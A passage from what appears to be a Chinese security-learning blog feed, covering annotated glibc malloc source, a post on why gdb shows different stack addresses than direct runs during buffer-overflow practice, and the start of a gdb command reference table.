如果大小合适，返回给用户</span></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (victim);</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p>如果大小不合适，就放入对应的samllbin或largebin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 放入对应的bin中</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              <span class="comment">// 当前largebin的头部</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order</span></span><br><span class="line"><span class="comment">              维持largebin的顺序 </span></span><br><span class="line"><span class="comment">              */</span></span><br><span class="line">            <span class="comment">//  如果largebin不为空</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons </span></span><br><span class="line"><span class="comment">                  用或来加速比较*/</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below </span></span><br><span class="line"><span class="comment">                  如果比最小的小，就插入到链表的尾部*/</span></span><br><span class="line">                  <span class="comment">// 判断bck-&gt;bk是否在mainarena</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="comment">// fwd指向largebin的头</span></span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      <span class="comment">// bck指向largebin的尾</span></span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">                      <span class="comment">// victm的fd_nextsize指向largebin的第一个chunk</span></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      <span class="comment">// victim 的 bk_nextsize 指向原来链表的第一个 chunk 指向的 bk_nextsize</span></span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      <span class="comment">// 原来链表的第一个 chunk 的 bk_nextsize 指向 victim</span></span><br><span class="line">                      <span class="comment">// 原来指向链表第一个 chunk 的 fd_nextsize 指向 victim</span></span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="comment">/*</span></span><br><span class="line"><span class="comment">                      当前要插入的 victim 的大小大于最小的 chunk</span></span><br><span class="line"><span class="comment">                      */</span></span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          <span class="comment">// 放到对应的 bin 中，构成 bck&lt;--&gt;victim&lt;--&gt;fwd</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有，最大循环次数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 最大迭代次数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="检查large-bin"><a href="#检查large-bin" class="headerlink" title="检查large bin"></a>检查large bin</h4><p>如果用户申请的是largebin范围内的，在循环完unsortedbin之后，检查largebin。</p>
<p>检查largebin，找到满足要求的最小chunk。和其他bin不同的是，largebin需要保持chunk的大小顺序不被破环。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small </span></span><br><span class="line"><span class="comment">          如果对应的bin为空或者很小就跳过</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// first(bin)=bin-&gt;fd 表示当前链表中最大的chunk</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 反向遍历链表，直到找到第一个不小于所需chunk大小的chunk</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/*如果最终取到的chunk不是该bin中的最后一个chunk，并且该chunk与其前面的chunk的大小相同，那么我们就取其前面的chunk，这样可以避免调整bk_nextsize,fd_nextsize链表。因为大小相同的chunk只有一个会被串在nextsize链上。*/</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">		  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">		    malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="检查bin"><a href="#检查bin" class="headerlink" title="检查bin"></a>检查bin</h4><p>如果在largebin中也没有找到，说明用户所需的chunk不能直接从其对应的合适的 bin 中获取 chunk，所以我们需要来查找比当前 bin 更大的 fast bin ， small bin 或者 large bin。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">++idx;</span><br><span class="line">     <span class="comment">// 获取对应的bin</span></span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line">     <span class="comment">/*获取当前索引在binmap中的block索引,#define idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)  ,BINMAPSHIFT=5,Binmap按block管理，每个block为一个int，共32个bit，可以表示32个bin中是否有空闲chunk存在所以这里是右移5*/</span></span><br><span class="line">     block = idx2block (idx);</span><br><span class="line">     <span class="comment">// 获取当前块大小对应的映射，这里可以得知相应的bin中是否有空闲块</span></span><br><span class="line">     <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">     <span class="comment">// #define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1))))</span></span><br><span class="line">     <span class="comment">// 将idx对应的比特位设置为1，其它位为0</span></span><br><span class="line">     bit = idx2bit (idx);</span><br></pre></td></tr></table></figure>

<p>根据binmap来搜索bin。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                <span class="keyword">goto</span> use_top;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">          bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">          bit = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">      <span class="comment">// 从当前map的最小的bin一直找，直到找到合适的bin。</span></span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          bin = next_bin (bin);</span><br><span class="line">          bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">          assert (bit != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">      victim = last (bin);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*  If a false alarm (empty bin), clear the bit.</span></span><br><span class="line"><span class="comment">      如果victim == bin，将map对应位清0，然后取下一个</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin)</span><br><span class="line">        &#123;</span><br><span class="line">          av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">          bin = next_bin (bin);</span><br><span class="line">          bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">          assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* unlink */</span></span><br><span class="line">          unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Exhaust */</span></span><br><span class="line">          <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  set_non_main_arena (victim);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Split */</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                 have to perform a complete insert here.  */</span></span><br><span class="line">              bck = unsorted_chunks (av);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">              remainder-&gt;bk = bck;</span><br><span class="line">              remainder-&gt;fd = fwd;</span><br><span class="line">              bck-&gt;fd = remainder;</span><br><span class="line">              fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">              <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                av-&gt;last_remainder = remainder;</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line">            &#125;</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="使用top-chunk"><a href="#使用top-chunk" class="headerlink" title="使用top chunk"></a>使用top chunk</h4><p>如果所有的bin都不能满足要求，只能从top chunk中拆分。如果top chunk也不够的话，就只能通过sysmalloc再申请一些内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="comment">// 否则的话，我们就只能从系统中再次申请一点内存了。</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>gdb获取地址与直接运行程序时不一致的解决方案</title>
    <url>/posts/ff573ef1/</url>
    <content><![CDATA[<p> 基础的缓冲区溢出实践通常需要确定运行状态下程序中的某些局部变量的地址，如需要确定输入缓冲区的起始地址从而获得注入缓冲区中的机器指令的起始地址等。在 Linux 环境下，可通过 gdb 对程序进行动态调试，从而获得程序运行状态下的信息( 关闭 ALSR 机制 )，<strong>通过 gdb 动态调试获取的诸如缓冲区的起始地址等信息可能与程序实际运行时的信息并不相同</strong>，从而影响缓冲区溢出实践的效果。</p>
<a id="more"></a>

<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> *argv[] , <span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address of buff : %p \n&quot;</span>, buff );  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>关闭 ALSR 机制后，通过 <code>gcc -m32 -o hello -g -fno-stack-protector hello.c</code> 编译生成可执行文件 hello。</p>
<p>直接运行：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210311161213738.png" alt="image-20210311161213738"></p>
<p>gdb直接启动调试：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210311161303493.png" alt="image-20210311161303493"></p>
<h1 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h1><p>正常程序运行时，会将环境变量字符串数组和命令行参数字符串数组存放在栈顶，而程序使用的局部变量等数据则位于这些字符串数组之后。环境变量字符串数组记录了诸如当前用户名、终端类型、搜索路径等环境信息。程序直接运行时，程序进程继承的是运行其的 shell 的环境变量，而程序通过 gdb 运行时，程序进程继承的是 gdb 的环境变量，这两者存在不同，从而会造成位于栈上的局部变量的地址发生改变。用户可在 gdb 中运行 show environment 命令获得环境变量参数。</p>
<p>较之程序直接运行，位于栈顶的环境变量主要有以下变化：</p>
<ul>
<li> <strong>_ 环境变量的内容发生改变</strong>，在程序直接运行时，_ 变量存放的是程序的执行路径，而通过 gdb 运行程序时，_ 变量存放的是 gdb 的执行路径。</li>
</ul>
<p>　　使用 gdb 运行程序时，_ 环境变量的值为 /usr/bin/gdb.而在程序直接运行时，_ 环境变量的值应为程序的执行路径，如./hello.</p>
<ul>
<li>通过 gdb 运行的调试程序继承了 gdb 的环境变量，其中<strong>包含新加入的环境变量 LINES 和 COLUMNS</strong>。</li>
<li>位于栈上的参数列表也可能不同，当用户通过 ./hello 直接在shell 中运行程序时，位于参数数组的第一项 argv[0] 内容为”./hello” ,而用户通过 gdb 运行 hello 程序时，程序的参数列表的第一项 argv[0] 的值为该程序的绝对路径”/home/test/hello”，这也会造成程序运行时局部变量地址的差异。<strong>建议终端环境下使用绝对路径运行程序</strong>，避免该差异。</li>
</ul>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>通过gdb attach调试一个正在运行程序，其地址是和正在运行的程序一致的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span> *argv[] , <span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;&amp;s&quot;</span>,buff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;address of buff : %p \n&quot;</span>, buff );  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 <code>gcc -m32 -o test1 -g -fno-stack-protector test.c</code> 编译生成可执行文件 test1。</p>
<p>gdb attach调试：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210311162245927.png" alt="image-20210311162245927"></p>
<p>gdb直接调试：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210311162359103.png" alt="image-20210311162359103"></p>
<p>但是这种方法有局限性，有些时候pid无法获得，或者进程很快结束并不能attach。</p>
<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>参考文章</p>
<p>[<a href="https://www.cnblogs.com/yhjoker/p/9161716.html">针对 Linux 环境下 gdb 动态调试获取的局部变量地址与直接运行程序时不一致问题的解决方案</a>]</p>
<h2 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h2><p>比较通用的方法。</p>
<p>利用内核转储获取真实地址。</p>
<p>使用命令<code>ulimit -c unlimited</code>启动内核转储，缺省情况下，内核在coredump时所产生的core文件放在与该程序相同的目录中，并且文件名固定为core。</p>
<p>然后使用命令<code>gdb filename core</code>即可调试，获得真实地址。</p>
]]></content>
  </entry>
  <entry>
    <title>gdb命令表</title>
    <url>/posts/2002e51d/</url>
    <content><![CDATA[<h2 id="启动-GDB"><a href="#启动-GDB" class="headerlink" title="启动 GDB"></a>启动 GDB</h2><a id="more"></a>

<table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>gdb object</code></td>
<td>正常启动，加载可执行</td>
<td></td>
</tr>
<tr>
<td><code>gdb object core</code></td>
<td>对可执行 + core 文件进行调试</td>
<td></td>
</tr>
<tr>
<td><code>gdb object pid</code></td>
<td>对正在执行的进程进行调试</td>
<td></td>
</tr>
<tr>
<td><code>gdb</code></td>
<td>正常启动，启动后需要 file 命令手动加载</td>
<td></td>
</tr>
<tr>
<td><code>gdb -tui</code></td>
<td>启用 gdb 的文本界面（或 ctrl-x ctrl-a 更换 CLI/TUI）</td>
<td></td>
</tr>
</tbody></table>
<h2 id="帮助信息"><a href="#帮助信息" class="headerlink" title="帮助信息"></a>帮助信息</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>help</code></td>
<td>列出命令分类</td>
<td></td>
</tr>
<tr>
<td><code>help running</code></td>
<td>查看某个类别的帮助信息</td>
<td></td>
</tr>
<tr>
<td><code>help run</code></td>
<td>查看命令 run 的帮助</td>
<td></td>
</tr>
<tr>
<td><code>help info</code></td>
<td>列出查看程序运行状态相关的命令</td>
<td></td>
</tr>
<tr>
<td><code>help info line</code></td>
<td>列出具体的一个运行状态命令的帮助</td>
<td></td>
</tr>
<tr>
<td><code>help show</code></td>
<td>列出 GDB 状态相关的命令</td>
<td></td>
</tr>
<tr>
<td><code>help show commands</code></td>
<td>列出 show 命令的帮助</td>
<td></td>
</tr>
</tbody></table>
<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><table>
<thead>
<tr>
<th>命令</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><code>break main</code></td>
<td>对函数 main 设置一个断点，可简写为 b main</td>
<td></td>
</tr>
<tr>
<td><code>break 101</code></td>
<td>对源代码的行号设置断点，可简写为 b 101</td>
<td></td>
</tr>
<tr>
<td><code>break basic.c:101</code></td>
<td>对源代码和行号设置断点</td>
<td></td>
</tr>
<tr>
<td><code>break basic.c:foo</code></td>
<td>对源代码和函数名设置断点</td>
<td></td>
</tr>
<tr>
<td><code>break *0x00400448</code></td>
<td>对内存地址 0x00400448 设置断点</td>
<td></td>
</tr>
<tr>
<td><code>info breakpoints</code></td>
<td>列出当前的所有断点信息，可简写为 info break</td>
<td></td>
</tr>
<tr>
<td><code>delete 1</code></td>
<td>按编号删除一个断点</td>
<td></td>
</tr>
<tr>
<td><code>delete</code></td>
<td>删除所有断点</td>
<td></td>
</tr>
<tr>
<td><code>clear</code></td>
<td>删除在当前行的断点</td>
<td></td>
</tr>
<tr>
<td><code>clear function</code></td>
<td>删除函数断点</td>
<td></td>
</tr>
<tr>
<td><code>clear line</code></td>
<td>删除行号断点</td>
<td></td>
</tr>
<tr>
<td><code>clear basic.c:101</code></td>
<td>删除文件名和行号的断点</td>
<td></td>
</tr>
<tr>
<td><code>clear basic.c:main</code></td>
<td>删除文件名和函数名的断点</td>
<td></td>
</tr>
<tr>
<td><code>clear *0x00400448</code></td>
<td>删除内存地址的断点</td>
<td></td>
</tr>
<tr>
<td><code>disable 2</code></td>
